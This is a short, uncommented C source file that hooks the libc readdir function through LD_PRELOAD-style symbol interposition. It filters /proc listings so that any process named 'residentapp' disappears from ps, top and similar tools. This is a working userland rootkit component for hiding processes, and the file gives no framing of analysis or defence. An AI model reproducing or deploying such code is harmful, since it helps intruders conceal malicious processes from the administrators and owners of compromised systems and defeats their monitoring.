#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

typedef struct dirent* (*readdir_func_t)(DIR*);

static readdir_func_t original_readdir = NULL;

struct dirent* readdir(DIR *directory_stream) {
    if (original_readdir == NULL) {
        original_readdir = (readdir_func_t)dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent *current_entry;
    
    while ((current_entry = original_readdir(directory_stream)) != NULL) {
        if (current_entry->d_type == DT_DIR) {
            char *conversion_end;
            long pid_value = strtol(current_entry->d_name, &conversion_end, 10);
            
            if (conversion_end != current_entry->d_name && *conversion_end == '\0') {
                char proc_comm_path[300];
                snprintf(proc_comm_path, sizeof(proc_comm_path), 
                        "/proc/%ld/comm", pid_value);
                
                FILE *comm_file = fopen(proc_comm_path, "r");
                if (comm_file != NULL) {
                    char process_name[128];
                    if (fgets(process_name, sizeof(process_name), comm_file)) {
                        size_t len = strlen(process_name);
                        if (len > 0 && process_name[len-1] == '\n') {
                            process_name[len-1] = '\0';
                        }
                        
                        if (strcmp(process_name, "residentapp") == 0) {
                            fclose(comm_file);
                            continue;
                        }
                    }
                    fclose(comm_file);
                }
            }
        }
        
        return current_entry;
    }
    
    return NULL;
}